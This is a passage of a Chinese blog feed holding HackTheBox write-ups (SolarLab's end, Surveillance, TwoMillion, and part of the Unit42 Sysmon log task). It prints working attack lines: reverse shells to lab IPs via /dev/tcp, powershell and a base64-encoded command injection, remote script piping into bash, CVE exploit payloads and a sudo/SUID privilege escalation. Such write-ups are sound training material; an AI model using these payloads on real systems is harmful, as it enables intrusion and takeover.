<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">CREATE MEMORY TABLE PUBLIC.OFUSER(USERNAME VARCHAR(64) NOT NULL,STOREDKEY VARCHAR(32),SERVERKEY VARCHAR(32),SALT VARCHAR(32),ITERATIONS INTEGER,PLAINPASSWORD VARCHAR(32),ENCRYPTEDPASSWORD VARCHAR(255),NAME VARCHAR(100),EMAIL VARCHAR(100),CREATIONDATE VARCHAR(15) NOT NULL,MODIFICATIONDATE VARCHAR(15) NOT NULL,CONSTRAINT OFUSER_PK PRIMARY KEY(USERNAME))</span><br></pre></td></tr></table></figure>

<p>发现第7列对应的键值可能是凭证之类的，用github上的openfire工具后台管理密码解密 <a href="https://github.com/c0rdis/openfire_decrypt?tab=readme-ov-file">工具链接</a></p>
<p><img src="/article/SolarLab-HackTheBox/image-20240602231518952.png"></p>
<p>出现报错缺少passwordKey，往下翻翻找到</p>
<p><img src="/article/SolarLab-HackTheBox/image-20240602231610637.png"></p>
<p>跑出来密码后，那么就可以切换administrator用户</p>
<p><img src="/article/SolarLab-HackTheBox/image-20240602231639866.png"></p>
<p>上传一下RunasCs用来用户切换</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">certutil -urlcache -split -f http://10.10.14.88/RunasCs.exe</span><br></pre></td></tr></table></figure>

<p><img src="/article/SolarLab-HackTheBox/image-20240602232939862.png"></p>
<p>用powershell弹到本地1234端口</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">./RunasCs.exe administrator ThisPasswordShouldDo!@ powershell.exe -r 10.10.14.88:1234</span><br></pre></td></tr></table></figure>

<p>成功切换administrator用户拿到root的flag</p>
<p><img src="/article/SolarLab-HackTheBox/image-20240603000137332.png"></p>
]]></content>
      <categories>
        <category>渗透</category>
      </categories>
      <tags>
        <tag>HackTheBox</tag>
        <tag>Windows</tag>
      </tags>
  </entry>
  <entry>
    <title>Surveillance</title>
    <url>/article/Surveillance-HackTheBox.html</url>
    <content><![CDATA[<p>CVE-2023-41892、CVE-2023-26035</p>
<span id="more"></span>

<h1 id="Surveillance"><a href="#Surveillance" class="headerlink" title="Surveillance"></a>Surveillance</h1><h2 id="信息搜集"><a href="#信息搜集" class="headerlink" title="信息搜集"></a>信息搜集</h2><p>nmap扫描端口</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nmap -sV -sC -v -p- --min-rate 1000 10.10.11.245</span><br></pre></td></tr></table></figure>

<p><img src="/article/Surveillance-HackTheBox/image-20240111180818681.png"></p>
<p>扫出来两个端口，其中80端口有http服务并且重定向到surveillance.htb</p>
<p>那么我们添加下域名然后访问80端口，发现是企业网站尝试扫描子域名和目录无果后，用Wappalyzer插件看看</p>
<p><img src="/article/Surveillance-HackTheBox/image-20240111184949465.png"></p>
<p>得知是Craft CMS后，去网上搜一下发现存在远程代码执行漏洞(CVE-2023-41892) <a href="https://cloud.tencent.com/developer/article/2365764?areaId=106001">参考文章</a></p>
<p>payload</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">action=conditions/render&amp;test[userCondition]=craft\elements\conditions\users\UserCondition&amp;config=&#123;&quot;name&quot;:&quot;test[userCondition]&quot;,&quot;as xyz&quot;:&#123;&quot;class&quot;:&quot;\\GuzzleHttp\\Psr7\\FnStream&quot;,    &quot;__construct()&quot;: [&#123;&quot;close&quot;:null&#125;],&quot;_fn_close&quot;:&quot;phpinfo&quot;&#125;&#125;</span><br></pre></td></tr></table></figure>

<p>抓包修改为POST请求，添加payload成功RCE</p>
<p><img src="/article/Surveillance-HackTheBox/image-20240111185214507.png"></p>
<p>仔细分析此payload的执行过程，原来是调用call_user_func函数只有一个参数，想反弹shell就卡住了</p>
<h2 id="getshell"><a href="#getshell" class="headerlink" title="getshell"></a>getshell</h2><p>我在GitHub上找到写好的getshell脚本 <a href="https://github.com/Faelian/CraftCMS_CVE-2023-41892">脚本链接</a></p>
<p>成功反弹</p>
<p><img src="/article/Surveillance-HackTheBox/image-20240111194741978.png"></p>
<p>由于不稳定，我们反弹到自己机子上</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">bash -c &quot;bash -i &gt;&amp; /dev/tcp/10.10.14.74/1028 0&gt;&amp;1&quot;</span><br></pre></td></tr></table></figure>

<p><img src="/article/Surveillance-HackTheBox/image-20240111195321224.png"></p>
<p>我们注意到<code>/craft/storage/backups</code>目录下有zip文件</p>
<p>先开启http服务，用wget下载下来查看</p>
<p><img src="/article/Surveillance-HackTheBox/image-20240111200833565.png"></p>
<p>解压后打开看发现有信息泄露</p>
<p><img src="/article/Surveillance-HackTheBox/image-20240111201305915.png"></p>
<p>直接拿join爆破一下，结果出现报错，提示使用其他哈希类型</p>
<p><img src="/article/Surveillance-HackTheBox/image-20240111203634494.png"></p>
<p>最终在类型为Raw-SHA256爆破成功得到密码</p>
<p><img src="/article/Surveillance-HackTheBox/image-20240111203654261.png"></p>
<p>知道密码后我们直接ssh连接（这里是用户matthew）</p>
<p>得到user的flag</p>
<p><img src="/article/Surveillance-HackTheBox/image-20240111211630770.png"></p>
<p>然后就没有收获了，于是我们决定进行更深层的探测潜在的特权提升路径和漏洞</p>
<p>使用工具LinPEAS，我们现在本地开启http服务，然后使用curl命令去弹</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">curl http://10.10.14.74:8000/linpeas.sh | bash</span><br></pre></td></tr></table></figure>

<p>成功得到连接数据库的密码</p>
<p><img src="/article/Surveillance-HackTheBox/image-20240111214133572.png"></p>
<p>当然也可以得到用户名</p>
<p><img src="/article/Surveillance-HackTheBox/image-20240111214620372.png"></p>
<p>然后就进行mysql连接</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mysql -u craftuser -p -h localhost</span><br></pre></td></tr></table></figure>

<p><img src="/article/Surveillance-HackTheBox/image-20240111214901316.png"></p>
<p>然后在craftdb中的users表找到admin的相关信息</p>
<p><img src="/article/Surveillance-HackTheBox/image-20240111215203687.png"></p>
<p>使用john爆破失败</p>
<p>回头继续分析，发现8080端口开放</p>
<p><img src="/article/Surveillance-HackTheBox/image-20240111215950995.png"></p>
<p>那么我们使用ssh进行端口转发至本地的777端口</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ssh -L 777:localhost:8080 matthew@10.10.11.245</span><br></pre></td></tr></table></figure>

<p>然后在浏览器访问本地777端口，发现是ZoneMinder</p>
<p><img src="/article/Surveillance-HackTheBox/image-20240111220606278.png"></p>
<p>网上搜到ZoneMinder 代码执行漏洞(CVE-2023-26035)</p>
<p>GitHub上有现成的poc <a href="https://github.com/rvizx/CVE-2023-26035">参考链接</a></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python3 exploit.py -t http://localhost:777/ -ip 10.10.14.74 -p</span><br></pre></td></tr></table></figure>

<p>本地转发的777端口为target，然后1028为nc监听的端口</p>
<h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><p>连接到后<code>sudo -l</code>看看可执行的命令</p>
<p><img src="/article/Surveillance-HackTheBox/image-20240111223721833.png"></p>
<p>下面这些二进制文件都可以执行，参考其他师傅wp可以知道在zmupdate.pl文件存在漏洞</p>
<p>具体是指参数user的值可以为文件，那么我们可以上传shell脚本然后利用其user参数实现getshell</p>
<p>过程如下，写入并赋予suid可执行权限</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">echo &#x27;cp /bin/bash /var/tmp/bash;chmod 4755 /var/tmp/bash&#x27; &gt; /var/tmp/exploit.sh</span><br><span class="line">chmod +x /var/tmp/exploit.sh</span><br></pre></td></tr></table></figure>

<p>然后再执行刚刚说的利用参数user</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo /usr/bin/zmupdate.pl --version=1.36.32 --user=&#x27;$(/var/tmp/exploit.sh)&#x27; --pass=ZoneMinderPassword2023</span><br></pre></td></tr></table></figure>

<p>执行完后我们再<code>/var/tmp/bash -p</code>得到完整的root权限</p>
<p>得到flag</p>
<p><img src="/article/Surveillance-HackTheBox/image-20240111224745965.png"></p>
]]></content>
      <categories>
        <category>渗透</category>
      </categories>
      <tags>
        <tag>HackTheBox</tag>
        <tag>CMS</tag>
        <tag>提权</tag>
      </tags>
  </entry>
  <entry>
    <title>TwoMillion</title>
    <url>/article/TwoMillion-HackTheBox.html</url>
    <content><![CDATA[<p>OverlayFS 内核漏洞 （CVE-2023-0386）</p>
<span id="more"></span>

<h1 id="TwoMillion"><a href="#TwoMillion" class="headerlink" title="TwoMillion"></a>TwoMillion</h1><p><strong>信息搜集</strong></p>
<p>nmap扫描一下</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nmap -sV -v 10.10.11.221</span><br></pre></td></tr></table></figure>

<p>扫描结果</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">PORT     STATE    SERVICE     VERSION</span><br><span class="line">22/tcp   open     ssh         OpenSSH 8.9p1 Ubuntu 3ubuntu0.1 (Ubuntu Linux; protocol 2.0)</span><br><span class="line">80/tcp   open     http        nginx</span><br><span class="line">3851/tcp filtered spectraport</span><br></pre></td></tr></table></figure>

<p>访问下80端口发现跳转到<code>2million.htb</code>，添加下<code>/etc/hosts</code></p>
<p>然后发现存在登录界面</p>
<p><img src="/article/TwoMillion-HackTheBox/image-20240416202314077.png"></p>
<p>我们扫一下目录</p>
<p><img src="/article/TwoMillion-HackTheBox/image-20240416202447836.png"></p>
<p>我们依次去访问看看</p>
<ul>
<li>&#x2F;api和&#x2F;api&#x2F;v1路由均不可访问</li>
<li>&#x2F;register路由可以注册用户，不过需要<code>Invite code</code>且不可输入</li>
<li>主页的join功能可以访问&#x2F;invite路由，并且存在js源码</li>
</ul>
<p>访问复制下来然后调整一下 <a href="https://beautifier.io/">代码美化</a></p>
<p>注意勾上<code>打包器（packers）和混淆器（obfuscators）的功能</code></p>
<p><img src="/article/TwoMillion-HackTheBox/image-20240416210743024.png"></p>
<p>成功得到源码（也可以将该函数丢到控制台执行）</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">function verifyInviteCode(code) &#123;</span><br><span class="line">    var formData = &#123;</span><br><span class="line">        &quot;code&quot;: code</span><br><span class="line">    &#125;;</span><br><span class="line">    $.ajax(&#123;</span><br><span class="line">        type: &quot;POST&quot;,</span><br><span class="line">        dataType: &quot;json&quot;,</span><br><span class="line">        data: formData,</span><br><span class="line">        url: &#x27;/api/v1/invite/verify&#x27;,</span><br><span class="line">        success: function(response) &#123;</span><br><span class="line">            console.log(response)</span><br><span class="line">        &#125;,</span><br><span class="line">        error: function(response) &#123;</span><br><span class="line">            console.log(response)</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function makeInviteCode() &#123;</span><br><span class="line">    $.ajax(&#123;</span><br><span class="line">        type: &quot;POST&quot;,</span><br><span class="line">        dataType: &quot;json&quot;,</span><br><span class="line">        url: &#x27;/api/v1/invite/how/to/generate&#x27;,</span><br><span class="line">        success: function(response) &#123;</span><br><span class="line">            console.log(response)</span><br><span class="line">        &#125;,</span><br><span class="line">        error: function(response) &#123;</span><br><span class="line">            console.log(response)</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>两个路由分别是用来验证邀请码和生成邀请码</p>
<p>我们先用curl命令发送下POST请求</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">curl -X POST http://2million.htb/api/v1/invite/how/to/generate</span><br></pre></td></tr></table></figure>

<p>得到回显，提示要ROT13解密</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    &quot;0&quot;: 200,</span><br><span class="line">    &quot;success&quot;: 1,</span><br><span class="line">    &quot;data&quot;: &#123;</span><br><span class="line">        &quot;data&quot;: &quot;Va beqre gb trarengr gur vaivgr pbqr, znxr n CBFG erdhrfg gb \/ncv\/i1\/vaivgr\/trarengr&quot;,</span><br><span class="line">        &quot;enctype&quot;: &quot;ROT13&quot;</span><br><span class="line">    &#125;,</span><br><span class="line">    &quot;hint&quot;: &quot;Data is encrypted ... We should probbably check the encryption type in order to decrypt it...&quot;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>找一个ROT13在线解码，得到信息要去<code>/api/v1/invite/generate</code>发送POST请求即可得到邀请码</p>
<p><img src="/article/TwoMillion-HackTheBox/image-20240416211753024.png"></p>
<p>发送POST请求，得到邀请码</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    &quot;0&quot;: 200,</span><br><span class="line">    &quot;success&quot;: 1,</span><br><span class="line">    &quot;data&quot;: &#123;</span><br><span class="line">        &quot;code&quot;: &quot;QldKWDMtSDlQMVAtT1k0NVQtWks5V0I=&quot;,</span><br><span class="line">        &quot;format&quot;: &quot;encoded&quot;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这里很明显是base64加密的，解码即可</p>
<p><img src="/article/TwoMillion-HackTheBox/image-20240416212244668.png"></p>
<p>bp抓包添加上邀请码</p>
<p><img src="/article/TwoMillion-HackTheBox/image-20240416212711323.png"></p>
<p>出现302说明注册成功，我们直接登录</p>
<p><img src="/article/TwoMillion-HackTheBox/image-20240416213026087.png"></p>
<p>当我们再次访问之前的<code>/api/v1</code></p>
<p><img src="/article/TwoMillion-HackTheBox/image-20240416213222821.png"></p>
<p>我们注意到<code>/api/v1/admin/settings/update</code>路由，用PUT请求可以更新user的设置</p>
<p>bp抓包试试，回显<code>Invalid content type</code>，应该是要添加Content-Type解析json数据</p>
<p><img src="/article/TwoMillion-HackTheBox/image-20240416213757982.png"></p>
<p>添加Content-Type头之后提示缺少email参数。由于路由是admin的，大概率是要admin的email</p>
<p>我们继续查看<code>/api/v1/admin/vpn/generate</code>路由，POST请求发现回显<code>Unauthorized</code>，我们只能回到刚刚的update路由下再看看，我们添加上email参数值为我们注册的邮箱，回显如下</p>
<p><img src="/article/TwoMillion-HackTheBox/image-20240416215119320.png"></p>
<p>得到信息<code>is_admin</code>参数应该是用来判断是否为admin用户，我们添加上并改为1后发包</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">	&quot;email&quot;:&quot;test@qq.com&quot;,</span><br><span class="line">	&quot;is_admin&quot;:1</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>然后再次访问<code>/api/v1/admin/vpn/generate</code>，回显缺少username参数</p>
<p>添加上成功回显</p>
<p><img src="/article/TwoMillion-HackTheBox/image-20240416215424687.png"></p>
<p>这里参考wp说是存在命令注入漏洞，通过sleep函数检测</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">	&quot;username&quot;:&quot;test;sleep 2&quot;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>payload如下</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">	&quot;username&quot;:&quot;test;echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC41Ny8xMDI4IDA+JjE=|base64 -d|bash&quot;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>成功反弹shell</p>
<p><img src="/article/TwoMillion-HackTheBox/image-20240416222115130.png"></p>
<p>我们不妨看看源码是如何注入的，查看下<code>/controllers/VPNController.php</code></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">admin_vpn</span>(<span class="params"><span class="variable">$router</span></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (!<span class="keyword">isset</span>(<span class="variable">$_SESSION</span>[<span class="string">&#x27;loggedin&#x27;</span>]) || <span class="variable">$_SESSION</span>[<span class="string">&#x27;loggedin&#x27;</span>] !== <span class="literal">true</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="title function_ invoke__">header</span>(<span class="string">&quot;HTTP/1.1 401 Unauthorized&quot;</span>);</span><br><span class="line">            <span class="keyword">exit</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (!<span class="keyword">isset</span>(<span class="variable">$_SESSION</span>[<span class="string">&#x27;is_admin&#x27;</span>]) || <span class="variable">$_SESSION</span>[<span class="string">&#x27;is_admin&#x27;</span>] !== <span class="number">1</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="title function_ invoke__">header</span>(<span class="string">&quot;HTTP/1.1 401 Unauthorized&quot;</span>);</span><br><span class="line">            <span class="keyword">exit</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (!<span class="keyword">isset</span>(<span class="variable">$_SERVER</span>[<span class="string">&#x27;CONTENT_TYPE&#x27;</span>]) || <span class="variable">$_SERVER</span>[<span class="string">&#x27;CONTENT_TYPE&#x27;</span>] !== <span class="string">&#x27;application/json&#x27;</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="title function_ invoke__">json_encode</span>([</span><br><span class="line">                <span class="string">&#x27;status&#x27;</span> =&gt; <span class="string">&#x27;danger&#x27;</span>,</span><br><span class="line">                <span class="string">&#x27;message&#x27;</span> =&gt; <span class="string">&#x27;Invalid content type.&#x27;</span></span><br><span class="line">            ]);</span><br><span class="line">            <span class="keyword">exit</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="variable">$body</span> = <span class="title function_ invoke__">file_get_contents</span>(<span class="string">&#x27;php://input&#x27;</span>);</span><br><span class="line">        <span class="variable">$json</span> = <span class="title function_ invoke__">json_decode</span>(<span class="variable">$body</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (!<span class="keyword">isset</span>(<span class="variable">$json</span>)) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="title function_ invoke__">json_encode</span>([</span><br><span class="line">                <span class="string">&#x27;status&#x27;</span> =&gt; <span class="string">&#x27;danger&#x27;</span>,</span><br><span class="line">                <span class="string">&#x27;message&#x27;</span> =&gt; <span class="string">&#x27;Missing parameter: username&#x27;</span></span><br><span class="line">            ]);</span><br><span class="line">            <span class="keyword">exit</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (!<span class="variable">$json</span>-&gt;username) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="title function_ invoke__">json_encode</span>([</span><br><span class="line">                <span class="string">&#x27;status&#x27;</span> =&gt; <span class="string">&#x27;danger&#x27;</span>,</span><br><span class="line">                    <span class="string">&#x27;message&#x27;</span> =&gt; <span class="string">&#x27;Missing parameter: username&#x27;</span></span><br><span class="line">            ]);</span><br><span class="line">            <span class="keyword">exit</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="variable">$username</span> = <span class="variable">$json</span>-&gt;username;</span><br><span class="line"></span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">regenerate_user_vpn</span>(<span class="variable">$router</span>, <span class="variable">$username</span>);</span><br><span class="line">        <span class="variable">$output</span> = <span class="title function_ invoke__">shell_exec</span>(<span class="string">&quot;/usr/bin/cat /var/www/html/VPN/user/<span class="subst">$username</span>.ovpn&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="title function_ invoke__">is_array</span>(<span class="variable">$output</span>) ? <span class="title function_ invoke__">implode</span>(<span class="string">&quot;&lt;br&gt;&quot;</span>, <span class="variable">$output</span>) : <span class="variable">$output</span>;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
<p>我们注意到<code>$username</code>传递给<code>regenerate_user_vpn</code>函数，并且只是要求username为json格式</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">regenerate_user_vpn</span>(<span class="params"><span class="variable">$router</span>, <span class="variable">$user</span> = <span class="literal">null</span></span>) </span>&#123;</span><br><span class="line">       <span class="keyword">if</span> (<span class="variable">$user</span> != <span class="literal">null</span>) &#123;</span><br><span class="line">           <span class="title function_ invoke__">exec</span>(<span class="string">&quot;/bin/bash /var/www/html/VPN/gen.sh <span class="subst">$user</span>&quot;</span>, <span class="variable">$output</span>, <span class="variable">$return_var</span>);</span><br><span class="line">       &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">           <span class="keyword">if</span> (!<span class="keyword">isset</span>(<span class="variable">$_SESSION</span>[<span class="string">&#x27;loggedin&#x27;</span>]) || <span class="variable">$_SESSION</span>[<span class="string">&#x27;loggedin&#x27;</span>] !== <span class="literal">true</span>) &#123;</span><br><span class="line">               <span class="keyword">return</span> <span class="title function_ invoke__">header</span>(<span class="string">&quot;HTTP/1.1 401 Unauthorized&quot;</span>);</span><br><span class="line">               <span class="keyword">exit</span>;</span><br><span class="line">           &#125;</span><br><span class="line">           <span class="keyword">if</span> (!<span class="keyword">isset</span>(<span class="variable">$_SESSION</span>[<span class="string">&#x27;username&#x27;</span>]) || <span class="variable">$_SESSION</span>[<span class="string">&#x27;username&#x27;</span>] == <span class="literal">null</span>) &#123;</span><br><span class="line">               <span class="keyword">return</span> <span class="title function_ invoke__">header</span>(<span class="string">&quot;HTTP/1.1 401 Unauthorized&quot;</span>);</span><br><span class="line">               <span class="keyword">exit</span>;</span><br><span class="line">           &#125;</span><br><span class="line"></span><br><span class="line">           <span class="variable">$username</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">remove_special_chars</span>(<span class="variable">$_SESSION</span>[<span class="string">&#x27;username&#x27;</span>]);</span><br><span class="line">           <span class="variable">$fileName</span> = <span class="variable">$username</span>. <span class="string">&quot;.ovpn&quot;</span>;</span><br><span class="line"></span><br><span class="line">           <span class="title function_ invoke__">exec</span>(<span class="string">&quot;/bin/bash /var/www/html/VPN/gen.sh <span class="subst">$username</span>&quot;</span>, <span class="variable">$output</span>, <span class="variable">$return_var</span>);</span><br><span class="line"></span><br><span class="line">           <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">download_vpn</span>(<span class="variable">$fileName</span>);</span><br><span class="line">       &#125;</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure>

<p>那么在传递到<code>regenerate_user_vpn</code>函数后很明显是可以命令拼接，利用<code>;</code>来实现命令注入</p>
<p>拼接结果如下，执行id命令并注释掉后面代码</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">exec(&quot;/bin/bash /var/www/html/VPN/gen.sh test;id#&quot;, $output, $return_var);</span><br></pre></td></tr></table></figure>

<p>回到题目，我们ls一下发现存在<code>.env</code>文件，应该存在个人信息</p>
<p><img src="/article/TwoMillion-HackTheBox/image-20240416222758989.png"></p>
<p>得到admin用户的密码，那么我们直接连接本地数据库</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mysql -u admin -p -h localhost</span><br></pre></td></tr></table></figure>

<p>得到其他用户的个人信息</p>
<p><img src="/article/TwoMillion-HackTheBox/image-20240416224613203.png"></p>
<p>不过没什么用，因为我们可以直接ssh连接</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ssh admin@10.10.11.221</span><br><span class="line">SuperDuperPass123</span><br></pre></td></tr></table></figure>

<p>连接上后，先在<code>/home/admin/</code>拿到user的flag</p>
<p>然后参考wp说是有hint，在<code>/var/mail/admin</code></p>
<p><img src="/article/TwoMillion-HackTheBox/image-20240416233525168.png"></p>
<p>经过搜索找到OverlayFS 内核漏洞 （CVE-2023-0386）</p>
<p><a href="https://github.com/Fanxiaoyao66/CVE-2023-0386">exp链接</a></p>
<p>我们先开启http服务，在靶机用wget命令复制到<code>/tmp</code>目录下</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">wget http://10.10.14.57/exp.sh</span><br><span class="line">wget http://10.10.14.57/fuse.c</span><br></pre></td></tr></table></figure>

<p>然后执行<code>/bin/bash exp.sh</code>，成功提权（该目录还有其他师傅传的exp）</p>
<p><img src="/article/TwoMillion-HackTheBox/image-20240416234624574.png"></p>
]]></content>
      <categories>
        <category>渗透</category>
      </categories>
      <tags>
        <tag>HackTheBox</tag>
        <tag>提权</tag>
      </tags>
  </entry>
  <entry>
    <title>Unit42</title>
    <url>/article/Unit42-HackTheBox.html</url>
    <content><![CDATA[<p>Windows系统日志分析</p>
<span id="more"></span>



<h1 id="Unit42"><a href="#Unit42" class="headerlink" title="Unit42"></a>Unit42</h1><h2 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h2><blockquote>
<p>在本次 Sherlock 中，您将熟悉 Sysmon 日志和各种有用的 EventID，用于识别和分析 Windows 系统上的恶意活动。 Palo  Alto 的 Unit42 最近对 UltraVNC 活动进行了研究，其中攻击者利用 UltraVNC  的后门版本来维持对系统的访问。该实验室受到该活动的启发，并指导参与者完成该活动的初始访问阶段。</p>
</blockquote>
<h2 id="Task1"><a href="#Task1" class="headerlink" title="Task1"></a>Task1</h2><p><strong>事件 ID 为 11 的事件日志有多少个？</strong></p>
<p>在右边任务栏的筛选日志，添加筛选ID</p>
<p><img src="/article/Unit42-HackTheBox/image-20240421232853013.png"></p>
<p>筛选后在最上面一行显示总共56个</p>
<p><img src="/article/Unit42-HackTheBox/image-20240421232830997.png"></p>
<h2 id="Task2"><a href="#Task2" class="headerlink" title="Task2"></a>Task2</h2><p><strong>每当在内存中创建一个进程时，都会记录一个事件 ID 为 1  的事件，其中包含命令行、哈希值、进程路径、父进程路径等详细信息。这些信息对于分析人员来说非常有用，因为它允许我们查看所有程序在系统上执行，这意味着我们可以发现正在执行的任何恶意进程。感染受害者系统的恶意进程是什么？</strong></p>
<p>我们先筛选事件1，然后找到如下信息</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">C:\Windows\SysWOW64\msiexec.exe</span><br><span class="line">5.0.19041.3636 (WinBuild.160101.0800)</span><br><span class="line">Windows® installer</span><br><span class="line">Windows Installer - Unicode</span><br><span class="line">Microsoft Corporation</span><br><span class="line">msiexec.exe</span><br><span class="line">&quot;C:\Windows\system32\msiexec.exe&quot; /i &quot;C:\Users\CyberJunkie\AppData\Roaming\Photo and Fax Vn\Photo and vn 1.1.2\install\F97891C\main1.msi&quot; AI_SETUPEXEPATH=C:\Users\CyberJunkie\Downloads\Preventivo24.02.14.exe.exe SETUPEXEDIR=C:\Users\CyberJunkie\Downloads\ EXE_CMD_LINE=&quot;/exenoupdates  /forcecleanup  /wintime 1707880560  &quot; AI_EUIMSI=&quot;&quot;</span><br><span class="line">C:\Users\CyberJunkie\Downloads\</span><br><span class="line">DESKTOP-887GK2L\CyberJunkie</span><br><span class="line">EV_RenderedValue_13.00</span><br><span class="line">1814183</span><br><span class="line">1</span><br><span class="line">Medium</span><br><span class="line">SHA1=9AB9B12901E1EA2DF943B45AD20D8732618608CD,MD5=898277AC5894C4E1412A49040053B0D3,SHA256=445A2E800DC68DF89ABF713F3B4B632D40AE6310EF3660B42D974BB582426BC5,IMPHASH=E4E40938E4BF6C66424859ED02171C41</span><br><span class="line">EV_RenderedValue_18.00</span><br><span class="line">10672</span><br><span class="line">C:\Users\CyberJunkie\Downloads\Preventivo24.02.14.exe.exe</span><br><span class="line">&quot;C:\Users\CyberJunkie\Downloads\Preventivo24.02.14.exe.exe&quot; </span><br><span class="line">DESKTOP-887GK2L\CyberJunkie</span><br></pre></td></tr></table></figure>

<p>大概意思是使用<code>msiexec.exe</code>命令行工具安装一个MSI软件包，并设置了一些环境变量。但是我们注意到<code>Preventivo24.02.14.exe.exe</code>文件，去google搜一下发现是恶意程序，所以本题答案为<code>C:\Users\CyberJunkie\Downloads\Preventivo24.02.14.exe.exe</code></p>
<p><img src="/article/Unit42-HackTheBox/image-20240421234156127.png"></p>
<h2 id="Task3"><a href="#Task3" class="headerlink" title="Task3"></a>Task3</h2><p><strong>哪个云驱动器被用来分发恶意软件？</strong></p>
<p>我们按照时间排序，在刚刚恶意程序前的时间去找，找到恶意程序在火狐浏览器下的</p>
<p><img src="/article/Unit42-HackTheBox/image-20240421235246213.png"></p>
<p>再往前推，在第一行事件22注意到出现的<code>uc2f030016253ec53f4953980a4e.dl.dropboxusercontent.com</code></p>
<p>相关搜索了解到dropbox是一种云存储服务</p>
<h2 id="Task4"><a href="#Task4" class="headerlink" title="Task4"></a>Task4</h2><p><strong>初始恶意文件在磁盘上创建的许多文件都带有时间戳（一种防御规避技术，更改文件创建日期以使其看起来很旧）。 PDF 文件的时间戳更改为多少？</strong></p>
<p>直接搜索pdf，找到更改时间</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">创建的UTC时间（CreationUtcTime）：2024年1月14日08:10:06.029</span><br><span class="line">上一个创建的UTC时间（PreviousCreationUtcTime）：2024年2月14日03:41:58.404</span><br></pre></td></tr></table></figure>

<p>所以答案为<code>2024-01-14 08:10:06</code></p>
<h2 id="Task5"><a href="#Task5" class="headerlink" title="Task5"></a>Task5</h2><p><strong>恶意文件在磁盘上删除了一些文件。 “once.cmd”在磁盘上的何处创建？请回答完整路径和文件名。</strong></p>
<p>直接搜就行</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">C:\Users\CyberJunkie\AppData\Roaming\Photo and Fax Vn\Photo and vn 1.1.2\install\F97891C\WindowsVolume\Games\once.cmd</span><br></pre></td></tr></table></figure>

<h2 id="Task6"><a href="#Task6" class="headerlink" title="Task6"></a>Task6</h2><p><strong>恶意文件尝试到达虚拟域，很可能是为了检查互联网连接状态。它尝试连接到哪个域名？</strong></p>
<p>翻一下就找到了</p>
